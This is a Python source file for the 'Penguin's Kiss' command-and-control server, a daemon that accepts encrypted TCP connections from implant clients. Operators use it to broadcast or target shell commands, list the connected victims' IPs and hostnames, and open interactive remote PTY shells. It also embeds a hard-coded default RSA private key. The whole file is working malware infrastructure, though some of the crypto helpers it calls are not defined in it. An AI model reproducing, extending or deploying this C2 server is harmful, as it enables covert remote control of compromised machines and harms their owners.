import os, sys, socket, threading, signal, json
from concurrent.futures import ThreadPoolExecutor

# initial crypto config
SERVER_PROMPT = b'pk> '
CONNECTED_PROMPT = b'$ '
DEFAULT_PRIVKEY = {
    'n' : 566985700738319622174686131400034453643720466970978517574628629274979976524124940713860540038882426013024114564601644133774454954579859603022526047211561634473245368041734849645333850659593387029777461624139999293346678168096585398894872902836488432305321788895930893995350254306011511954048973993218576068120842406854381660868440914954041085267631248545101914138883676131275460708745009456577214046268195248043933401098454229528930264593554947172986600022924103676180205323189749504546460222696144254434950563003806500524021358243739253925888283568187475109036444929999292467231057057868003949542201486910774286204467263359268168124928585201908563486221036238676222817747434022603388355897696091620276281574099795985472307965135468502881374317279001616973398539298555877212283138431306761372378738101671232030286096798836533645647014376468992868000495595560982785914820504104078715279785802300066599327401921364225207587243296778060887445799525002269634182195900334989318967452442166075135355126785800284396564017524632233821326493688824504309419677467169118434525079593731269479730143537689127087750148171355493757239210404790175123435648784211703985569364347710928586741341454862278795609365544396160373248258804813219121521794117,
    'd': 556837628245436992258594353745698118228243955874087329373840686858641854357062082245249550621215930968800587604498530952381998240636252551824799220329355219818361610519831879130449485998047954022683316904590489563406405444426333561415224980059626492773543671826566612159798644554253703334153350963570508721005384754791574549035450677481451705329292120197093849300930908197101084167076060678138086956589500876529284670160381281251812984272999536442652387565428490913738235430699986833553997982416263008566934068345774167260144814410181017435736659956708708789203377351335496900390004981500773703531352617659109757194578984857180398552528891333113022224791018685454843296797667603791554700637297860618002492108978467427456668104433428337512441346843300723241861425217786682449652009806902779786726468810049128846369952153062504613238668046106715766225913013878725374564881609360260298003325733625331843908626880708147525900261607013505358791540629330161310254014903842144797601317221440909449161962394110410342659474869213071878556273369065034348504204889807185950624322995301874762713559375336446823625047623366082274935910850205164805850493608044771494978419878162374325380208609212967302669554969905283343054612922077635187252461953,
}

def betterstr(obj):
    if type(obj) == str:
        return obj
    return str(obj, 'utf-8') if type(obj) == bytes else str(obj)

def prompt_str():
    global tcp_clients
    return CONNECTED_PROMPT if len(tcp_clients) > 0 else SERVER_PROMPT

def motd():
    mstr = '################################################################################\n'\
         + '#                                Penguin\'s Kiss                                #\n'\
         + '#                                         _,\u2764                                  #\n'\
         + '#                                  _.--""\'/                                    #\n'\
         + '#                                 )-._.-\)                                     #\n'\
         + '#                          Command & Control Software                          #\n'\
         + '#                    Contact cflems@cflems.net for support.                    #\n'\
         + '################################################################################\n'
    return bytes(mstr, 'utf-8')

def showcrypto():
    global privkey
    return '[warcrypto] Server public key:\n{"n": %d, "e": %d}' % (privkey['n'], privkey['e'])

def dispatch_command(sock, command, rpubkey):
    global bits
    send_encrypted(sock, command, rpubkey['e'], rpubkey['n'], bits=bits)

def dispatch_ccmd(client, command):
    dispatch_command(client['sock'], command, client['pubkey'])

# brint takes a string
def brint(*args, sep=' ', end='\n', prompt=True):
    s = '%s%s' % (sep.join(map(lambda s: betterstr(s), args)), end)
    bnnl(s, logging=prompt)

def bnnl(s, logging=False):
    sys.stdout.write(betterstr(s))
    sys.stdout.flush()
    broadcast_screens(s, sv_prompt=logging, ctd_prompt=logging)

def broadcast_screens(s, skip=set(), sv_prompt=False, ctd_prompt=False):
    if type(s) != bytes:
        s = bytes(s, 'utf-8')

    global alive, screens, screens_lock, tcp_clients
    screens_lock.acquire()
    if not alive:
        screens_lock.release()
        return
    i = 0
    while alive and i < len(screens):
        if screens[i] in skip:
            i += 1
            continue
        try:
            screens[i].sendall(s)
            if sv_prompt and len(tcp_clients) < 1:
                screens[i].sendall(SERVER_PROMPT)
            if ctd_prompt and len(tcp_clients) > 0:
                screens[i].sendall(CONNECTED_PROMPT)
            i += 1
        except:
            screens[i].close()
            del screens[i]
    screens_lock.release()

def blast_command(cmd, orig_screen, targets=set()):
    print('[INFO] Blasting command: %s to %s' % (betterstr(cmd), betterstr(targets)))
    if type(cmd) != bytes:
        cmd = bytes(cmd, 'utf-8')

    global alive
    if not alive:
        return
    broadcast_screens(cmd+b'\n', skip=[orig_screen], sv_prompt=True, ctd_prompt=False)
    if not alive:
        return

    wildcard = len(targets) < 1
    global cmdq, cmdq_lock, tcpc_lock
    cmdq_lock.acquire()
    if not alive:
        cmdq_lock.release()
        return
    tcpc_lock.acquire()
    i = 0
    while alive and i < len(tcp_clients):
        try:
            if tcp_clients[i]['pty']:
                continue
            if wildcard or i in targets:
                dispatch_ccmd(tcp_clients[i], cmd)
            if wildcard:
                tcp_clients[i]['qidx'] += 1
        except:
            tcp_clients[i]['alive'] = False
        finally:
            i += 1
    tcpc_lock.release()
    if wildcard:
        cmdq.append(cmd)
    cmdq_lock.release()

def tcp_handshake(sock):
    global privkey, bits, exp
    nbytes, headsz = bits//8, 2
    rnbytes = int.from_bytes(sock.recv(headsz), 'big')
    sock.sendall(nbytes.to_bytes(headsz, 'big'))

    if rnbytes != nbytes:
        brint('[ERROR] nbytes mismatch with client: %d vs %d' % (rnbytes, nbytes))
        return False

    rpubkey = { 'n': int.from_bytes(recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits),\
                'big'), 'e': exp }

    return rpubkey

def tcp_disconnect(client):
    global alive, tcp_clients, tcpc_lock
    tcpc_lock.acquire()
    if not alive:
        tcpc_lock.release()
        return
    client['sock'].close()
    printdc = False
    if client in tcp_clients:
        printdc = True
        cliidx = tcp_clients.index(client)
        dcmsg = '[INFO] TCP Client %d disconnected.' % cliidx
        del tcp_clients[cliidx]
    tcpc_lock.release()
    if printdc:
        brint(dcmsg)

def transport_tcp(client):
    global tcp_clients, tcpc_lock
    try:
        rpk = tcp_handshake(client['sock'])
    except Exception as e:
        brint('[ERROR] %s' % repr(e))
        rpk = False
    if not rpk:
        brint('[INFO] Handshake failed; disconnecting client:', client['addr'])
        client['alive'] = False
        tcp_disconnect(client)
        return
    client['pubkey'] = rpk

    global alive, cmdq, cmdq_lock, privkey, bits
    while alive:
        if not client['alive']:
            tcp_disconnect(client)
            return
        
        if not client['pty'] and len(cmdq) > client['qidx']:
            cmdq_lock.acquire()
            if not alive:
                cmdq_lock.release()
                return
            if not client['alive']:
                cmdq_lock.release()
                tcp_disconnect(client)
                return
            if client['pty'] or len(cmdq) <= client['qidx']:
                cmdq_lock.release()
                continue

            cmd = cmdq[client['qidx']]
            client['qidx'] += 1
            cmdq_lock.release()
            try:
                dispatch_ccmd(client, cmd)
            except:
                client['alive'] = False
                tcp_disconnect(client)
                return
        else:
            try:
                if client['pty']:
                    data = client['pty_is'].recv()
                else:
                    data = recv_encrypted(client['sock'], privkey['d'], privkey['n'], bits=bits)
            except:
                data = False
            if not alive:
                return
            elif not data or data == b'\xde\xad':
                client['alive'] = False
                tcp_disconnect(client)
                if client['pty']:
                    unpty(client)
                return
            elif data == b'\xc0\xdeflush':
                continue
            elif not client['pty']:
                bnnl(data, logging=False)
            elif data == b'\xc0\xdenpty':
                unpty(client)
            else:
                try:
                    client['pty'].sendall(data)
                except:
                    unpty(client)
                    print('Screen failed to receive PTY data:', data)

def serve_tcp():
    global sockets, tcp_port
    if tcp_port < 1:
        brint('[INFO] TCP listener disabled.')
        return

    sockets['tcp'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock = sockets['tcp']
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', tcp_port))
        sock.listen(5)
    except:
        brint('[WARNING] Error binding TCP socket, TCP listener will now die.')
        sock.close()
        del sockets['tcp']
        return
    brint('[INFO] TCP listener started on port %d' % tcp_port)

    global alive, pool, tcp_clients, tcpc_lock
    while alive:
        try:
            cs, ca = sock.accept()
        except:
            brint('[WARNING] Error accepting TCP client, moving on.')
            continue

        if not alive:
            cs.close()
            return
        brint('[INFO] Connection from', ca[0], 'over TCP.', prompt=False)

        tcpcli = {
            'addr': ca,
            'sock': cs,
            'qidx': 0,
            'pty': False,
            'alive': True
        }
        tcpc_lock.acquire()
        if not alive:
            tcpc_lock.release()
            return
        tcp_clients.append(tcpcli)
        tcpc_lock.release()
        try:
            pool.submit(transport_tcp, tcpcli)
        except RuntimeError:
            return

def detach_screen(screen):
    global screens, screens_lock
    screens_lock.acquire()
    if not alive:
        screens_lock.release()
        return

    sidx = -1
    if screen in screens:
        sidx = screens.index(screen)
        del screens[sidx]
    screens_lock.release()
    try:
        screen.sendall(b'\xde\xad')
    except:
        pass
    screen.close()
    brint('[INFO] Screen detaching: %d' % sidx)

def cliinfo(clients):
    try:
        info = ''
        i = 0
        while i < len(clients):
            record = {}
            record['ip'] = clients[i]['addr'][0]
            record['rport'] = clients[i]['addr'][1]
            try:
                record['rdns'] = socket.getnameinfo(clients[i]['addr'], 0)[0]
            except:
                pass
            info += '- %d: %s\n' % (i, str(record))
            i += 1
        info += '[pk] %d total.' % i
        return info
    except Exception as e:
        return repr(e)

def unpty(client):
    global alive, tcp_clients, tcpc_lock
    tcpc_lock.acquire()
    if not alive:
        tcpc_lock.release()
        return
    client['pty'] = False
    del client['pty_is']
    del client['pty_os']
    tcpc_lock.release()

def run_pty(screen, cn):
    global alive, tcp_clients, tcpc_lock, privkey, bits
    tcpc_lock.acquire()
    if not alive:
        tcpc_lock.release()
        return

    if cn >= len(tcp_clients):
        tcpc_lock.release()
        return 'Client %d disconnected while attaching PTY.' % cn
    client = tcp_clients[cn]
    pty_os = OutStreamCipher(client['sock'], client['pubkey'], bits=bits)
    client['pty_os'] = pty_os
    client['pty_is'] = InStreamCipher(client['sock'], privkey, bits=bits)
    client['pty'] = screen
    tcpc_lock.release()

    try:
        dispatch_ccmd(client, b'pty')
        if 'TERM' not in os.environ:
            os.environ['TERM'] = 'xterm-256color'
        pty_os.send(bytes(os.environ['TERM'], 'utf-8'))
    except Exception as e:
        client['alive'] = False
        return 'Client %d failed PTY handshake (%s).' % (cn, repr(e))

    try:
        screen.sendall(b'\xc0\xdepty')
    except:
        unpty(client)
        return False

    while True:
        if not alive:
            return
        elif not client['alive']:
            return 'PTY session terminated due to client disconnect.'
        elif not client['pty']:
            return 'PTY session ended normally.'
        elif client['pty'] != screen:
            return 'PTY session seized by another screen.'

        try:
            data = screen.recv(1024)
            if not alive:
                return False
        except:
            data = b'\xde\xad'
            # TODO: problem is here: we wake up and suddenly not in pty mode
        if not data or data == b'\xde\xad':
            unpty(client)
            return False
        elif alive and client['alive'] and client['pty'] == screen:
            try:
                pty_os.send(data)
            except:
                client['alive'] = False

def screen_reader(screen):
    global alive, screens, screens_lock, cmdq, cmdq_lock, tcp_clients, tcpc_lock

    try:
        screen.sendall(motd()+b'\n')
        screen.sendall(prompt_str())
    except Exception as e:
        print('[ERROR] Sending motd produced:', repr(e))
        detach_screen(screen)
        return

    while alive:
        try:
            data = screen.recv(1024).strip().split(b'\n')
        except:
            data = [b'\xde\xad']
        if not alive:
            return
        resp, shcmd = '', False
        for cmd in data:
            if not alive:
                break
            elif cmd == b'\xde\xad':
                detach_screen(screen)
                return
            elif cmd == b'nscreen':
                resp = 'Active screens: %d' % len(screens)
            elif cmd == b'ncli':
                resp = 'Active TCP clients: %d' % len(tcp_clients)
            elif cmd == b'lcli':
                tcpc_lock.acquire()
                if not alive:
                    tcpc_lock.release()
                    return
                resp = 'Active TCP clients:\n%s' % cliinfo(tcp_clients)
                tcpc_lock.release()
            elif cmd == b'lq':
                cmdq_lock.acquire()
                if not alive:
                    cmdq_lock.release()
                    return
                resp = '[%s]' % ', '.join(map(lambda s : repr(betterstr(s)), cmdq))
                cmdq_lock.release()
            elif cmd == b'cq':
                cmdq_lock.acquire()
                if not alive:
                    cmdq_lock.release()
                    return
                cmdq.clear()
                tcpc_lock.acquire()
                if not alive:
                    cmdq_lock.release()
                    tcpc_lock.release()
                    return
                for client in tcp_clients:
                    client['qidx'] = 0
                tcpc_lock.release()
                cmdq_lock.release()
            elif cmd == b'show-serverkey':
                resp = showcrypto()
            elif cmd == b'\xc0\xdeprompt':
                pass
            elif cmd == b'pty':
                resp = '[pk] Must specify a client to connect to via PTY.'
            elif cmd[:4] == b'pty ':
                try:
                    cn = int(cmd[4:])
                except:
                    cn = -1
                if cn < 0 or cn >= len(tcp_clients):
                    resp = '[pk] Cannot attach PTY to invalid TCP client.'
                else:
                    pty_out = run_pty(screen, cn)
                    if not alive:
                        return
                    if not pty_out:
                        detach_screen(screen)
                        return
                    try:
                        screen.sendall(b'\xc0\xdenpty')
                    except:
                        detach_screen(screen)
                        return
                    resp = '[pk] %s' % pty_out
            elif len(cmd) > 0:
                shcmd = True
                targets = []
                if cmd[:7] == b'TARGET=':
                    if b' ' in cmd:
                        sep = cmd.index(b' ')
                        for tval in cmd[7:sep].split(b','):
                            try:
                                targets.append(int(tval))
                            except:
                                resp += '[pk] Invalid target: %s. Must be an integer.\n' % tval
                        cmd = cmd[sep+1:]
                        resp = resp.strip()
                    else:
                        resp = '[pk] Can\'t target null command.'
                blast_command(cmd, screen, targets=targets)
            if not alive:
                return
            try:
                if len(resp) > 0:
                    screen.sendall(bytes('%s\n' % resp, 'utf-8'))
                if len(tcp_clients) < 1:
                    screen.sendall(SERVER_PROMPT)
                elif not shcmd:
                    screen.sendall(CONNECTED_PROMPT)
            except Exception as e:
                print('[ERROR] Sending command result produced:', repr(e))
                detach_screen(screen)
                return

def serve_screens():
    global sockets
    try:
        sockets['screen'] = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock = sockets['screen']
        oldmask = os.umask(0o002)
        sock.bind(socket_file)
        os.umask(oldmask)
        sock.listen(5)
    except:
        print('[FATAL] Unable to bind socket file.')
        cleanup()

    global alive, pool, screens, screens_lock
    while alive:
        try:
            screen, _ = sock.accept()
        except:
            brint('[WARNING] Error accepting screen attachment, moving on.')
            continue
        if not alive:
            screen.close()
            return

        screens_lock.acquire()
        if not alive:
            screens_lock.release()
            return
        screens.append(screen)
        screens_lock.release()

        try:
            pool.submit(screen_reader, screen)
        except RuntimeError:
            return

def cleanup(*args):
    global alive, sockets, tcp_port, socket_file
    brint('[INFO] Received stop signal, shutting down daemon.')
    alive = False
    if 'tcp' in sockets:
        sockets['tcp'].close()
        try:
            ws = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ws.connect(('0.0.0.0', tcp_port))
            ws.close()
        except:
            pass
    if 'screen' in sockets:
        sockets['screen'].close()
        try:
            ws = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            ws.connect(socket_file)
            ws.close()
        except:
            pass

    global tcp_clients, tcpc_lock, screens, screens_lock, bits
    screens_lock.acquire()
    for screen in screens:
        try:
            screen.sendall(b'\xde\xad')
        except:
            pass
        screen.close()
    screens_lock.release()

    tcpc_lock.acquire()
    for client in tcp_clients:
        try:
            dispatch_ccmd(client, b'tunnel')
        except:
            pass
        client['sock'].close()
    tcpc_lock.release()

    global pool
    pool.shutdown(wait=True, cancel_futures=True)

    global pid_file
    os.remove(pid_file)
    os.remove(socket_file)
    os.close(sys.stdout.fileno())
    os.close(sys.stderr.fileno())

    sys.exit(0)

def defaultint(s, default=0):
    try:
        return int(s)
    except:
        return default

def main(args):
    # initialize server
    if len(args) < 3:
        print('[FATAL] Insufficient arguments.')
        sys.exit(1)

    global socket_file, pid_file, tcp_port, bits
    socket_file = args[0]
    pid_file = args[1]
    log_file = args[2]
    bits = defaultint(args[3], 4096) if len(args) > 3 else 4096
    tcp_port = defaultint(args[4], 2236) if len(args) > 4 else 2236
    key_file = args[5] if len(args) > 5 else None

    if os.path.exists(pid_file):
        print('[FATAL] Another PK instance is already running.')
        sys.exit(1)

    try:
        logfd = os.open(log_file, os.O_WRONLY | os.O_APPEND | os.O_CREAT, mode=0o644)
    except:
        print('[FATAL] Unable to open log file.')
        sys.exit(1)

    cpid = os.fork()
    if cpid > 0:
        sys.exit(0)
    elif cpid < 0:
        print('[FATAL] Failed to fork PK daemon process.')
        os.close(logfd)
        sys.exit(1)

    os.close(sys.stdin.fileno())
    os.dup2(logfd, sys.stdout.fileno())
    os.dup2(logfd, sys.stderr.fileno())
    os.close(logfd)

    try:
        pidf = open(pid_file, 'w')
        pidf.write('%d' % os.getpid())
        pidf.close()
    except:
        print('[FATAL] Could not open pid file.')
        os.close(sys.stdout.fileno())
        os.close(sys.stderr.fileno())
        sys.exit(1)

    if os.path.exists(socket_file):
        try:
            os.remove(socket_file)
        except:
            print('[FATAL] Socket file exists and daemon doesn\'t have permission to clear it.')
            os.close(sys.stdout.fileno())
            os.close(sys.stderr.fileno())
            os.remove(pid_file)
            sys.exit(1)

    global privkey, exp
    privkey = DEFAULT_PRIVKEY
    if key_file:
        try:
            with open(key_file, 'r') as kf:
                kj = json.load(kf)
                privkey = {'n': int(kj['n']), 'd': int(kj['d']), 'e': int(kj['e']) if 'e' in kj else exp}
        except:
            pass

    global alive, sockets, pool, screens, tcp_clients, cmdq
    global screens_lock, tcpc_lock, cmdq_lock

    sockets = {}

    pool = ThreadPoolExecutor()
    screens = []
    screens_lock = threading.Lock()
    tcp_clients = []
    tcpc_lock = threading.Lock()
    cmdq = []
    cmdq_lock = threading.Lock()
    alive = True

    signal.signal(signal.SIGTERM, cleanup)

    pool.submit(serve_tcp)
    print('[INFO] Daemon started successfully.')
    serve_screens()

if __name__ == '__main__':
    main(sys.argv[1:])
